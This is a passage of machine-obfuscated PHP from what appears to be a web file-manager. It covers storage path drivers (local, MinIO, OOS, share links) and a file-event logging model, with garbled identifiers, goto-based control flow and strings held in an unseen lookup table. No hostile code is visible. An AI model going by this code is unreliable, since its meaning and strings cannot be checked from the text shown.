array($Dëî³‡×©Å[75] => $fÄ‹®îâÇ . $Dëî³‡×©Å[8], $Dëî³‡×©Å[76] => 1, $Dëî³‡×©Å[106] => @filemtime($fÄ‹®îâÇ), $Dëî³‡×©Å[77] => 0); $this->listAll($fÄ‹®îâÇ, $BĞšä‘ÂÜ); } else { $BĞšä‘ÂÜ[] = array($Dëî³‡×©Å[75] => $fÄ‹®îâÇ, $Dëî³‡×©Å[76] => 0, $Dëî³‡×©Å[106] => @filemtime($fÄ‹®îâÇ), $Dëî³‡×©Å[77] => $this->size($fÄ‹®îâÇ)); } } closedir($Dá•©®Ùã…); goto B›…ßÊğœĞ; E•ô³ÕøÚÏ: $Dëî³‡×©Å =& $_SERVER[Õİõş]; $dÙêËäÁç = $this->iconvSystem($dÙêËäÁç); $dÙêËäÁç = rtrim($dÙêËäÁç, $Dëî³‡×©Å[8]) . $Dëî³‡×©Å[8]; goto DÂ›Òô¶ßø; b­ï•§æøí: } public function has($CçÕÙÜì¬ï, $cˆæ‡¨Ó¨ = false, $AÅ‹Í×Í = true) { goto dºİò§Ğù‹; aÎîŞàÛÃ‚: if (!($C”¦ôÕ­‡ = @opendir($CçÕÙÜì¬ï))) { return !1; } $eì§ğ¤ÈÉ = 0; $D¡Î¼´¢èµ = 0; goto B›öîèŠ÷â; dºİò§Ğù‹: $A°–ªç…Á» =& $_SERVER[Õİõş]; $CçÕÙÜì¬ï = $this->iconvSystem($CçÕÙÜì¬ï); $CçÕÙÜì¬ï = rtrim($CçÕÙÜì¬ï, $A°–ªç…Á»[8]) . $A°–ªç…Á»[8]; goto aÎîŞàÛÃ‚; B›öîèŠ÷â: while (($e‡¼© ¸ã = readdir($C”¦ôÕ­‡)) !== !1) { if ($e‡¼© ¸ã == $A°–ªç…Á»[91] || $e‡¼© ¸ã == $A°–ªç…Á»[1160]) { continue; } $Aè»¼ëĞˆè = $CçÕÙÜì¬ï . $e‡¼© ¸ã; if ($cˆæ‡¨Ó¨) { if (@is_file($Aè»¼ëĞˆè)) { $eì§ğ¤ÈÉ++; } else { $D¡Î¼´¢èµ++; } continue; } if ($AÅ‹Í×Í) { if (@is_file($Aè»¼ëĞˆè)) { return !0; } } else { if (@is_dir($Aè»¼ëĞˆè . $A°–ªç…Á»[8])) { return !0; } } } closedir($C”¦ôÕ­‡); if ($cˆæ‡¨Ó¨) { return array($A°–ªç…Á»[187] => $eì§ğ¤ÈÉ, $A°–ªç…Á»[188] => $D¡Î¼´¢èµ); } goto cÙªÌÏª…Û; cÙªÌÏª…Û: return !1; goto Dìè¬¬Úƒ; Dìè¬¬Úƒ: } public function hashSimple($F©”ŒÀ¶«ç) { goto cÕŞ·×Î„; F‚À×œ¦Í­: return md5($dø›Çí¾Å) . $Eçï—·¿; goto C½‹ù¡ôŠ÷; A›·¥²Ã”…: $Eçï—·¿ = $this->size($F©”ŒÀ¶«ç); $D®‹†„é‹› = 200; $A§ª·ø•‘¶ = 50; goto D‚ÃÎÕ–ù; DÅİ¹õ¸Ş: $D‡ŸŒãÀò = fopen($F©”ŒÀ¶«ç, $D½Ìõ­¾Æ‘[1165]); if (!$D‡ŸŒãÀò) { return $dø›Çí¾Å; } for ($DŸ”ĞÕÊ÷ = 0; $DŸ”ĞÕÊ÷ < $A§ª·ø•‘¶; $DŸ”ĞÕÊ÷++) { fseek($D‡ŸŒãÀò, $AØ…ÜÁØİã * $DŸ”ĞÕÊ÷); $dø›Çí¾Å .= fread($D‡ŸŒãÀò, $D®‹†„é‹›); } goto E·“ª»ÖÓô; E·“ª»ÖÓô: fseek($D‡ŸŒãÀò, $Eçï—·¿ - $D®‹†„é‹›); $dø›Çí¾Å .= fread($D‡ŸŒãÀò, $D®‹†„é‹›); fclose($D‡ŸŒãÀò); goto F‚À×œ¦Í­; cÕŞ·×Î„: $D½Ìõ­¾Æ‘ =& $_SERVER[Õİõş]; if (!$F©”ŒÀ¶«ç) { return md5($D½Ìõ­¾Æ‘[33]); } $F©”ŒÀ¶«ç = $this->iconvSystem($F©”ŒÀ¶«ç); goto A›·¥²Ã”…; D‚ÃÎÕ–ù: if ($Eçï—·¿ <= $D®‹†„é‹› * $A§ª·ø•‘¶) { return $this->hashMd5($F©”ŒÀ¶«ç) . $Eçï—·¿; } $dø›Çí¾Å = $D½Ìõ­¾Æ‘[33]; $AØ…ÜÁØİã = intval($Eçï—·¿ / $A§ª·ø•‘¶); goto DÅİ¹õ¸Ş; C½‹ù¡ôŠ÷: } public function getContent($aõâñ¬ñÕø) { $aõâñ¬ñÕø = $this->iconvSystem($aõâñ¬ñÕø); return file_get_contents($aõâñ¬ñÕø); } public function setContent($ağâ‹§‚µ‡, $D˜ô Ğß…­ = '') { $ağâ‹§‚µ‡ = $this->iconvSystem($ağâ‹§‚µ‡); @file_put_contents($ağâ‹§‚µ‡, $D˜ô Ğß…­, LOCK_EX); clearstatcache(); return strlen($D˜ô Ğß…­) == filesize($ağâ‹§‚µ‡); } public function fileSubstr($d¾ÑÑÑ´‘–, $a”˜ø•µé = 0, $BÄÀÛï¼·Ë = false) { goto d„ºÕÏˆõ—; bŠ¼Øë—½Š: return $C±ì·ÏÛ‚ª; goto f·Ë†´äˆ; d„ºÕÏˆõ—: $a„ŸÈÖ–›ù =& $_SERVER[Õİõş]; $d¾ÑÑÑ´‘– = $this->iconvSystem($d¾ÑÑÑ´‘–); if ($BÄÀÛï¼·Ë === !1) { $BÄÀÛï¼·Ë = $this->size($d¾ÑÑÑ´‘–); } goto AªÙØ‡Ãš¨; eäîôĞ„†í: fseek($Dà¿²áŒ½¯, $a”˜ø•µé); $C±ì·ÏÛ‚ª = fread($Dà¿²áŒ½¯, $BÄÀÛï¼·Ë); fclose($Dà¿²áŒ½¯); goto bŠ¼Øë—½Š; AªÙØ‡Ãš¨: if ($BÄÀÛï¼·Ë <= 0) { return $a„ŸÈÖ–›ù[33]; } $Dà¿²áŒ½¯ = fopen($d¾ÑÑÑ´‘–, $a„ŸÈÖ–›ù[1165]); if (!$Dà¿²áŒ½¯) { return !1; } goto eäîôĞ„†í; f·Ë†´äˆ: } public function upload($b §Ãá†âÊ, $eÜçğ”‘ç, $D¹š†Œ÷¶‘ = false, $aìƒ¹ »’ = REPEAT_REPLACE) { $B„×·Šƒá = $this->copyFile($eÜçğ”‘ç, $b §Ãá†âÊ); return $B„×·Šƒá ? $this->getPathOuter($b §Ãá†âÊ) : !1; } public function download($CÒéÈæ³Ë÷, $EÙîêÓÒö‚) { return $this->iconvSystem($CÒéÈæ³Ë÷); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($béè¢šŒƒ³) { parent::__construct($béè¢šŒƒ³); $this->signatureVersion($_SERVER[Õİõş][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($FÃ×Ûª·´µ) { parent::__construct($FÃ×Ûª·´µ); $this->signatureVersion($_SERVER[Õİõş][196]); } public function fileOutLink($D›‚£’öåØ) { $DÜìƒ‘ˆà¬ =& $_SERVER[Õİõş]; if (substr($D›‚£’öåØ, 0, 7) == $DÜìƒ‘ˆà¬[1111]) { $D›‚£’öåØ = $DÜìƒ‘ˆà¬[1112] . substr($D›‚£’öåØ, 7); } header($DÜìƒ‘ˆà¬[152] . $D›‚£’öåØ); die; } } goto dÌÁ‹Œ”´³; fó¸Èñ¯µ: class PathDriverDbShareItem extends PathDriverDB { public function __construct($cğÇêŒ¡) { $this->pathParse = $cğÇêŒ¡; $this->model = Model($_SERVER[Õİõş][1113]); } public function getPathOuter($AŞ³©ğ‚Õ) { $dÇ‡ï¹æˆô =& $_SERVER[Õİõş]; if (!$AŞ³©ğ‚Õ) { return $AŞ³©ğ‚Õ; } $a¨¿ŠŞÏæÏ = $this->parse($AŞ³©ğ‚Õ); return trim(KodIO::makeShare($this->pathParse[$dÇ‡ï¹æˆô[363]], $a¨¿ŠŞÏæÏ[$dÇ‡ï¹æˆô[363]]), $dÇ‡ï¹æˆô[8]); } protected function infoParse($c‹ñäŠÑì, $F»ãä˜‰¤ë = false, $C¹…—Í“‡ë = false) { $f†›ª‡Ãì­ =& $_SERVER[Õİõş]; $EÏßë†Ü¶ = $this->pathParse[$f†›ª‡Ãì­[363]]; $EæÛê§ƒà = trim($this->pathParse[$f†›ª‡Ãì­[1013]], $f†›ª‡Ãì­[8]); return Action($f†›ª‡Ãì­[1119])->sharePathInfo($EÏßë†Ü¶, $EæÛê§ƒà); } public function infoFull($E‡èéÉ«Êå) { $AŸÏÊÕ¾Ü =& $_SERVER[Õİõş]; $a¼ØÎïÛõĞ = explode($AŸÏÊÕ¾Ü[8], trim($E‡èéÉ«Êå, $AŸÏÊÕ¾Ü[8])); if (count($a¼ØÎïÛõĞ) > 1) { $e¬š½—›†³ = implode($AŸÏÊÕ¾Ü[8], array_splice($a¼ØÎïÛõĞ, 1)); $D¸èó•îµ— = $this->model->pathInfoByPath($a¼ØÎïÛõĞ[0], $e¬š½—›†³); if (!$D¸èó•îµ—) { return !1; } $this->pathParse[$AŸÏÊÕ¾Ü[1013]] = $D¸èó•îµ—[$AŸÏÊÕ¾Ü[365]]; } return $this->infoParse($E‡èéÉ«Êå); } public function listAll($DÈôÜâã¨°) { goto EãÈ‹…Íİ; a©Ü­šËß©: $c¨â¯Ù®‚¿ = $this->model->listAll($DÈôÜâã¨°); $E¾È’ºôµ¨ = Model($céä›Œ³òŒ[531])->getInfo($A¯§¢¦Øí[$céä›Œ³òŒ[436]]); $Aô•›§ˆ¡ = Action($céä›Œ³òŒ[1119]); goto dÏ‘æİ÷‚Í; dÏ‘æİ÷‚Í: foreach ($c¨â¯Ù®‚¿ as &$cë¤’Ñ˜—) { check_abort(); $cë¤’Ñ˜—[$céä›Œ³òŒ[387]] = $Aô•›§ˆ¡->_shareItemeParse($cë¤’Ñ˜—[$céä›Œ³òŒ[387]], $E¾È’ºôµ¨); } return $c¨â¯Ù®‚¿; goto a ×ÏŞä†; EãÈ‹…Íİ: $céä›Œ³òŒ =& $_SERVER[Õİõş]; $A¯§¢¦Øí = IO::info($this->pathParse[$céä›Œ³òŒ[75]]); if (!$A¯§¢¦Øí) { return array(); } goto a©Ü­šËß©; a ×ÏŞä†: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($b‡šÏñ¦³) { $this->pathParse = $b‡šÏñ¦³; $this->model = Model($_SERVER[Õİõş][1113]); } protected function infoParse($dÑ‚‚ùÕ, $B·ÌÔÀĞØÜ = false, $E§³‚ĞÃì¡ = false) { $Fß—®óÜŠ =& $_SERVER[Õİõş]; return Action($Fß—®óÜŠ[1019])->sharePathInfo($this->pathParse[$Fß—®óÜŠ[75]], !0); } public function listPath($EØÇ¢ÆØî, $dº¦º¶š© = false) { $D²­ºò˜…ß =& $_SERVER[Õİõş]; $FÄ£‹õˆ®í = parent::listPath($EØÇ¢ÆØî, $dº¦º¶š©); foreach ($FÄ£‹õˆ®í as $Fìœôø–¶» => $f–£ğË‹Ñ) { if (!in_array($Fìœôø–¶», array($D²­ºò˜…ß[73], $D²­ºò˜…ß[74]))) { continue; } foreach ($f–£ğË‹Ñ as $ešğÅ§· Ò => $e­Ú¬¡¯êİ) { $FÄ£‹õˆ®í[$Fìœôø–¶»][$ešğÅ§· Ò] = Action($D²­ºò˜…ß[1019])->shareItemInfo($e­Ú¬¡¯êİ); } } return $FÄ£‹õˆ®í; } public function listAll($dİ¾Ä‘Û½) { $b‚‹‘‘ÛßÃ =& $_SERVER[Õİõş]; $c±ä‰„öØ = IO::info($this->pathParse[$b‚‹‘‘ÛßÃ[75]]); if (!$c±ä‰„öØ) { return array(); } $c¾œÇ‚¢‘¼ = $this->model->listAll($dİ¾Ä‘Û½); foreach ($c¾œÇ‚¢‘¼ as &$Eôò„·»¾Ä) { $Eôò„·»¾Ä[$b‚‹‘‘ÛßÃ[387]] = Action($b‚‹‘‘ÛßÃ[1019])->shareItemInfo($Eôò„·»¾Ä[$b‚‹‘‘ÛßÃ[387]]); } return $c¾œÇ‚¢‘¼; } } class PathDriverDriverShareItem { public function __construct($b“®²Ê³·Ü) { $this->pathParse = $b“®²Ê³·Ü; } public function __call($bŠ¥Ñ¯…øÕ, $f™•‡š†¨) { $CØÅØ™šÚ¯ =& $_SERVER[Õİõş]; if (method_exists($this, $bŠ¥Ñ¯…øÕ)) { return; } $D˜ªÔ•çê = call_user_func_array(array($CØÅØ™šÚ¯[1120], $bŠ¥Ñ¯…øÕ), $f™•‡š†¨); $D´¼æÕ×…Ò = array($CØÅØ™šÚ¯[1121], $CØÅØ™šÚ¯[1122], $CØÅØ™šÚ¯[1123], $CØÅØ™šÚ¯[1124], $CØÅØ™šÚ¯[485], $CØÅØ™šÚ¯[487], $CØÅØ™šÚ¯[1125], $CØÅØ™šÚ¯[102], $CØÅØ™šÚ¯[1126], $CØÅØ™šÚ¯[1127]); if (in_array($bŠ¥Ñ¯…øÕ, $D´¼æÕ×…Ò)) { $D˜ªÔ•çê = $this->getPathOuter($D˜ªÔ•çê); } return $D˜ªÔ•çê; } public function copy($A“ØìÁ×Ş£, $FÉ±ĞùˆêÇ, $D¤ˆ„Œ¢‰® = false) { return $this->copyMove($A“ØìÁ×Ş£, $FÉ±ĞùˆêÇ, $D¤ˆ„Œ¢‰®, $_SERVER[Õİõş][485]); } public function move($D†ùà‹©éó, $b”¹Š£ã³”, $A…ÓàŒî‘Ô = false) { return $this->copyMove($D†ùà‹©éó, $b”¹Š£ã³”, $A…ÓàŒî‘Ô, $_SERVER[Õİõş][487]); } private function copyMove($cà»…±¹…È, $B—ƒšêÆÃ, $AàˆÃ†İ¯•, $D²ğ ç‹ª¶) { goto aæ¯„‘™©…; EØÔ£¡ôÃ: if ($D¬œÏ•Ò…->pathParse[$A¬Ü«°ä‹[1000]]) { $B—ƒšêÆÃ = $D¬œÏ•Ò…->pathParse[$A¬Ü«°ä‹[1000]]; } else { $B—ƒšêÆÃ = $cèë¸‘ÕôÓ; } $A‹ÉàÈÃ ğ = IO::copyMove($cà»…±¹…È, $B—ƒšêÆÃ, $AàˆÃ†İ¯•, $D²ğ ç‹ª¶); $A‹ÉàÈÃ ğ = $this->getPathOuter($A‹ÉàÈÃ ğ); goto d÷ğ×İÍË; aæ¯„‘™©…: $A¬Ü«°ä‹ =& $_SERVER[Õİõş]; $cèë¸‘ÕôÓ = $B—ƒšêÆÃ; $D¬œÏ•Ò… = IO::driverMake($B—ƒšêÆÃ); goto EØÔ£¡ôÃ; d÷ğ×İÍË: return $A‹ÉàÈÃ ğ; goto D¢£„£ô; D¢£„£ô: } public function pathFather($f´Ç¢¶˜óˆ) { return get_path_father($this->pathParse[$_SERVER[Õİõş][75]]); } public function iconvSystem($E×ÀäÁÕá…) { return $E×ÀäÁÕá…; } protected function infoParse($eÏğôÄæªñ) { $AŒ÷Ï…Ø¼é =& $_SERVER[Õİõş]; $AÈğ÷´öÒ = $this->pathParse[$AŒ÷Ï…Ø¼é[434]][$AŒ÷Ï…Ø¼é[1020]] . $this->pathParse[$AŒ÷Ï…Ø¼é[1013]]; $DÓøÕçĞÄ° = IO::info($AÈğ÷´öÒ); $e…§†œÜˆ¹ = $this->pathParse[$AŒ÷Ï…Ø¼é[434]]; return Action($AŒ÷Ï…Ø¼é[1119])->_shareItemeParse($DÓøÕçĞÄ°, $e…§†œÜˆ¹); } public function listAll($cÄ‹’âÙÎ¼) { $e‘Ü“¥ÖŠè =& $_SERVER[Õİõş]; $c¬ÁÀ‰‚µ = IO::listAll($cÄ‹’âÙÎ¼); $eëÍ¦õÉßÀ = $this->pathParse[$e‘Ü“¥ÖŠè[434]]; foreach ($c¬ÁÀ‰‚µ as &$E‡ƒô ßà) { check_abort(); $E‡ƒô ßà = array_merge(IO::info($E‡ƒô ßà[$e‘Ü“¥ÖŠè[75]]), $E‡ƒô ßà); $E‡ƒô ßà[$e‘Ü“¥ÖŠè[387]] = Action($e‘Ü“¥ÖŠè[1119])->_shareItemeParse($E‡ƒô ßà, $eëÍ¦õÉßÀ); } return $c¬ÁÀ‰‚µ; } public function getPathOuter($F¾µÈã‰É) { goto Eø›âò¶ëç; eÊ õŠ¹õæ: $aøØ˜‰à„¤ = KodIO::clear($F¾µÈã‰É); $BÈçéô¤øÁ = KodIO::clear($this->pathParse[$b°õã›¨–[434]][$b°õã›¨–[1020]]); $bğ½µ¥ï°Ÿ = substr($aøØ˜‰à„¤, strlen($BÈçéô¤øÁ)); goto fãÙß²äß©; fãÙß²äß©: if (substr($aøØ˜‰à„¤, 0, strlen($BÈçéô¤øÁ)) != $BÈçéô¤øÁ) { return !1; } return $this->pathParse[$b°õã›¨–[1014]] . $b°õã›¨–[8] . ltrim($bğ½µ¥ï°Ÿ, $b°õã›¨–[8]); goto cÜÜ²®Æª; Eø›âò¶ëç: $b°õã›¨– =& $_SERVER[Õİõş]; $EÖÒ†ª³Õ¿ = KodIO::parse($F¾µÈã‰É); if ($EÖÒ†ª³Õ¿[$b°õã›¨–[29]] == KodIO::KOD_SHARE_ITEM) { return $EÖÒ†ª³Õ¿[$b°õã›¨–[75]]; } goto eÊ õŠ¹õæ; cÜÜ²®Æª: } public function getType() { $E…ùÃ£ˆ†¿ =& $_SERVER[Õİõş]; $a¤¨²Æ¡Ä = str_replace($E…ùÃ£ˆ†¿[71], $E…ùÃ£ˆ†¿[33], get_class($this)); return strtolower($a¤¨²Æ¡Ä); } public function isTypeObject($D–İÈóÜò) { return IO::isTypeObject($D–İÈóÜò); } public function info($a¢ëÄ¯›‹Š) { return $this->infoParse($a¢ëÄ¯›‹Š); } public function infoAuth($F›„‚‚…”Ê) { return $this->infoParse($F›„‚‚…”Ê); } public function infoWithChildren($dİ²ïÅº¿¼) { return $this->infoParse($dİ²ïÅº¿¼); } public function infoFull($F‰Ÿ»Ó˜Ò†) { return $this->infoParse($F‰Ÿ»Ó˜Ò†); } } goto dßÆğ¸°‰á; b «§§: class SourceEventModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\x65\x5f\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\x65\x61\164\145\x54\151\x6d\145", "\164\x69\155\145", "\151\x6e\x73\x65\162\164", "\146\x75\x6e\143\x74\151\x6f\156"), array("\x64\145\x73\143", '', "\151\x6e\x73\145\162\164\54\x75\x70\144\141\x74\x65\54\x73\x65\154\x65\143\164", "\x6a\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($DËœãÄ·‡, $CÏ«¿ÉÎäö, $a„Í÷Ê˜îğ = '') { goto A‰†Üç¥Ú™; B‰ï§¯Ã: $dêÑéÕõ‡Ú = array($d£œ‘ äÍ[379] => $DËœãÄ·‡, $d£œ‘ äÍ[2245] => $E‚Ò²‡¼¸ß[$d£œ‘ äÍ[456]], $d£œ‘ äÍ[2246] => $E‚Ò²‡¼¸ß[$d£œ‘ äÍ[28]], $d£œ‘ äÍ[461] => $E‚Ò²‡¼¸ß[$d£œ‘ äÍ[461]], $d£œ‘ äÍ[1408] => USER_ID, $d£œ‘ äÍ[384] => $CÏ«¿ÉÎäö, $d£œ‘ äÍ[1410] => $a„Í÷Ê˜îğ); $this->addSystemLog($CÏ«¿ÉÎäö, $dêÑéÕõ‡Ú); return $this->add($dêÑéÕõ‡Ú); goto Fæ»öíÕÑà; A‰†Üç¥Ú™: $d£œ‘ äÍ =& $_SERVER[Õİõş]; if (!$this->eventSave) { return; } $E‚Ò²‡¼¸ß = Model($d£œ‘ äÍ[1113])->sourceInfo($DËœãÄ·‡); goto Cá¥¿ÓĞƒ; Cá¥¿ÓĞƒ: if (!$E‚Ò²‡¼¸ß) { return !1; } if ($this->isCacheEvent($E‚Ò²‡¼¸ß, $CÏ«¿ÉÎäö)) { return; } if ($a„Í÷Ê˜îğ && is_string($a„Í÷Ê˜îğ)) { $a„Í÷Ê˜îğ = array($d£œ‘ äÍ[2110] => $a„Í÷Ê˜îğ); } goto B‰ï§¯Ã; Fæ»öíÕÑà: } private function addSystemLog($cˆº ùïÜ, $DÒíê‰¾ß’) { $EŒˆö¸† =& $_SERVER[Õİõş]; if ($cˆº ùïÜ == $EŒˆö¸†[2247]) { $cˆº ùïÜ = $DÒíê‰¾ß’[$EŒˆö¸†[400]][$EŒˆö¸†[2248]]; } else { if (in_array($cˆº ùïÜ, array($EŒˆö¸†[2057], $EŒˆö¸†[2249]))) { $cˆº ùïÜ = $DÒíê‰¾ß’[$EŒˆö¸†[400]][$EŒˆö¸†[694]]; } } $FÍäö›õ¾™ = array_merge($DÒíê‰¾ß’, array($EŒˆö¸†[2250] => $DÒíê‰¾ß’[$EŒˆö¸†[365]], $EŒˆö¸†[2251] => $DÒíê‰¾ß’[$EŒˆö¸†[2251]])); Model($EŒˆö¸†[2021])->addLog($EŒˆö¸†[2252] . $cˆº ùïÜ, $FÍäö›õ¾™); } private function isCacheEvent($Cˆóë—‹ƒÇ, $Cª³¨ª«Ü) { if ($Cˆóë—‹ƒÇ[$_SERVER[Õİõş][367]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($E§´õ¶ëŞ¯, $DË’®äâ) { $dŸà”®å =& $_SERVER[Õİõş]; $BÌ‘Ğ¯÷¾ = Model($dŸà”®å[1113])->sourceInfo($E§´õ¶ëŞ¯); $e†Şá±—’â = array($dŸà”®å[2248] => $DË’®äâ, $dŸà”®å[28] => $BÌ‘Ğ¯÷¾[$dŸà”®å[28]]); return $this->addEvent($E§´õ¶ëŞ¯, $dŸà”®å[2247], $e†Şá±—’â); } public function eventFileEdit($EˆÊëˆ°çø) { $DôÅ¬öÚ– =& $_SERVER[Õİõş]; $E¢¸˜¥ğè = array($DôÅ¬öÚ–[2253] => $_SERVER[$DôÅ¬öÚ–[2254]], $DôÅ¬öÚ–[1727] => strtolower(ACTION)); return $this->addEvent($EˆÊëˆ°çø, $DôÅ¬öÚ–[2048], $E¢¸˜¥ğè); } public function eventRecycle($bíš™Æé, $CÄø™œ¯Ÿí) { return $this->addEvent($bíš™Æé, $_SERVER[Õİõş][2249], $CÄø™œ¯Ÿí); } public function eventRemove($DÊÈ‘Ö«åÔ) { $eÂ´˜ƒÉ— =& $_SERVER[Õİõş]; $dğò‚Ó¼¿¬ = Model($eÂ´˜ƒÉ—[1113])->sourceInfo($DÊÈ‘Ö«åÔ); $bß³Ï‹˜ç¯ = $dğò‚Ó¼¿¬[$eÂ´˜ƒÉ—[28]]; return $this->addEvent($dğò‚Ó¼¿¬[$eÂ´˜ƒÉ—[456]], $eÂ´˜ƒÉ—[2047], $bß³Ï‹˜ç¯); } public function eventShare($Cç™ÕƒùùÕ, $A©»²Ğ¹÷) { return $this->addEvent($Cç™ÕƒùùÕ, $_SERVER[Õİõş][2057], $A©»²Ğ¹÷); } public function eventMove($fÃÆƒäŠÇ¥, $EÑ—Àó¼íƒ, $aó „‹·) { goto d¡Í íÂ°×; AÙ›¤šÄ: $this->addEvent($EÑ—Àó¼íƒ, $dç˜İñÇËÎ[2259], $Dœ¼Å½’ÎÚ); goto D¼ãŞÁÍ‰; d­§ŸŞ†Ïº: $this->addEvent($fÃÆƒäŠÇ¥, $dç˜İñÇËÎ[487], $Dœ¼Å½’ÎÚ); $CÊ¹ÁÓñÉ† = $B«¢¬‰ÁÛµ->sourceInfo($fÃÆƒäŠÇ¥); $Dœ¼Å½’ÎÚ = array($dç˜İñÇËÎ[365] => $CÊ¹ÁÓñÉ†[$dç˜İñÇËÎ[365]], $dç˜İñÇËÎ[28] => $CÊ¹ÁÓñÉ†[$dç˜İñÇËÎ[28]]); goto AÙ›¤šÄ; d¡Í íÂ°×: $dç˜İñÇËÎ =& $_SERVER[Õİõş]; $B«¢¬‰ÁÛµ = Model($dç˜İñÇËÎ[1113]); $CÊ¹ÁÓñÉ† = $B«¢¬‰ÁÛµ->sourceInfo($fÃÆƒäŠÇ¥); goto b¹ÎñªÊÁÇ; b¹ÎñªÊÁÇ: $b‘ƒ²×®ƒ = $B«¢¬‰ÁÛµ->sourceInfo($EÑ—Àó¼íƒ); $Fƒö‡ŠÑ³ò = $B«¢¬‰ÁÛµ->sourceInfo($aó „‹·); $Dœ¼Å½’ÎÚ = array($dç˜İñÇËÎ[1008] => $EÑ—Àó¼íƒ, $dç˜İñÇËÎ[2255] => $b‘ƒ²×®ƒ[$dç˜İñÇËÎ[28]], $dç˜İñÇËÎ[2256] => $b‘ƒ²×®ƒ[$dç˜İñÇËÎ[461]], $dç˜İñÇËÎ[1009] => $aó „‹·, $dç˜İñÇËÎ[2257] => $Fƒö‡ŠÑ³ò[$dç˜İñÇËÎ[28]], $dç˜İñÇËÎ[2258] => $Fƒö‡ŠÑ³ò[$dç˜İñÇËÎ[461]]); goto d­§ŸŞ†Ïº; D¼ãŞÁÍ‰: } public function eventCopy($AçèÌ¸ğ«‰) { $this->eventCreate($AçèÌ¸ğ«‰, $_SERVER[Õİõş][485]); } public function eventRename($b„†ø²ÓÓ¿, $DÌ›º¯Û‹, $cèçöšØÎ¡) { $BìÜì°ÈÎ¹ =& $_SERVER[Õİõş]; $CØ˜Óàé«¡ = array($BìÜì°ÈÎ¹[1008] => $DÌ›º¯Û‹, $BìÜì°ÈÎ¹[1009] => $cèçöšØÎ¡); return $this->addEvent($b„†ø²ÓÓ¿, $BìÜì°ÈÎ¹[1125], $CØ˜Óàé«¡); } public function eventAddComment($A¢ßš·šİÙ, $C´Å¨¡) { return $this->addEvent($A¢ßš·šİÙ, $_SERVER[Õİõş][2260], $C´Å¨¡); } public function eventAddDesc($eöé£„ò­, $A§¦î¹Å) { return $this->addEvent($eöé£„ò­, $_SERVER[Õİõş][2261], $A§¦î¹Å); } public function listBySource($a™Ô«¾øÄ) { goto b‚­Î…‹ğô; b‚­Î…‹ğô: $cåğŞ‡É¿™ =& $_SERVER[Õİõş]; $cğášÔÆ„ = Model($cåğŞ‡É¿™[1113])->sourceInfo($a™Ô«¾øÄ); $b‚µËµÙ = array($cåğŞ‡É¿™[379] => $a™Ô«¾øÄ); goto bâ¼«“Ûˆ; bâ¼«“Ûˆ: if ($cğášÔÆ„[$cåğŞ‡É¿™[366]] == $cåğŞ‡É¿™[83]) { $DÄ‹ª…ÕÓ‹ = Model($cåğŞ‡É¿™[1113])->listSearchChildren($a™Ô«¾øÄ, 20000); $DÄ‹ª…ÕÓ‹[] = $a™Ô«¾øÄ . $cåğŞ‡É¿™[357]; $b‚µËµÙ = array($cåğŞ‡É¿™[365] => array($cåğŞ‡É¿™[7], $DÄ‹ª…ÕÓ‹)); } $eÌ‹Ì–ÅÜÁ = $this->where($b‚µËµÙ)->order($cåğŞ‡É¿™[2262])->selectPage(); if ($eÌ‹Ì–ÅÜÁ[$cåğŞ‡É¿™[347]][$cåğŞ‡É¿™[348]] == 0) { $eÌ‹Ì–ÅÜÁ[$cåğŞ‡É¿™[347]][$cåğŞ‡É¿™[348]] = 1; $eÌ‹Ì–ÅÜÁ[$cåğŞ‡É¿™[350]] = array(array($cåğŞ‡É¿™[379] => $a™Ô«¾øÄ, $cåğŞ‡É¿™[2245] => $cğášÔÆ„[$cåğŞ‡É¿™[456]], $cåğŞ‡É¿™[1408] => $cğášÔÆ„[$cåğŞ‡É¿™[374]], $cåğŞ‡É¿™[384] => $cåğŞ‡É¿™[2263], $cåğŞ‡É¿™[385] => $cğášÔÆ„[$cåğŞ‡É¿™[183]], $cåğŞ‡É¿™[1410] => $cåğŞ‡É¿™[33])); } goto d‡åÖ–¨²†; d‡åÖ–¨²†: $eÌ‹Ì–ÅÜÁ = $this->eventListParse($eÌ‹Ì–ÅÜÁ, $a™Ô«¾øÄ); show_json($eÌ‹Ì–ÅÜÁ); goto Dßñ¶ß†Â‡; Dßñ¶ß†Â‡: } private function eventListParse($A¯ƒØ™Ó†İ, $DÀ‡ò•Ş) { goto BĞ‚²µ§×Æ; DàçºÄææ†: $a°ğ© ø¯  = array_to_keyvalue($Eáº‘¯ĞÛ, $A¼è¹í„î[33], $A¼è¹í„î[2251]); foreach ($Eáº‘¯ĞÛ as $fĞÄæ‹İÙ²) { $Fèµ£’¥‚Œ = $fĞÄæ‹İÙ²[$A¼è¹í„î[400]]; if ($fĞÄæ‹İÙ²[$A¼è¹í„î[29]] == $A¼è¹í„î[487] && isset($Fèµ£’¥‚Œ[$A¼è¹í„î[1008]])) { $B…ÑİÕÕæ[] = $Fèµ£’¥‚Œ[$A¼è¹í„î[1008]] . $A¼è¹í„î[33]; $B…ÑİÕÕæ[] = $Fèµ£’¥‚Œ[$A¼è¹í„î[1009]] . $A¼è¹í„î[33]; } if ($fĞÄæ‹İÙ²[$A¼è¹í„î[29]] == $A¼è¹í„î[2259] && isset($Fèµ£’¥‚Œ[$A¼è¹í„î[365]])) { $B…ÑİÕÕæ[] = $Fèµ£’¥‚Œ[$A¼è¹í„î[365]] . $A¼è¹í„î[33]; } } $B…ÑİÕÕæ = array_merge($B…ÑİÕÕæ, $a°ğ© ø¯ , array($DÀ‡ò•Ş . $A¼è¹í„î[33])); goto fßÁÀïñ¦—; FƒÖâïÏ´Ó: $a‘öÛœ‡¸ç = Model($A¼è¹í„î[754])->sourceListInfo($B…ÑİÕÕæ, !0); foreach ($Eáº‘¯ĞÛ as &$fĞÄæ‹İÙ²) { if ($fĞÄæ‹İÙ²[$A¼è¹í„î[29]] == $A¼è¹í„î[487] && isset($fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[1008]])) { $fĞÄæ‹İÙ²[$A¼è¹í„î[400]][$A¼è¹í„î[1008]] = 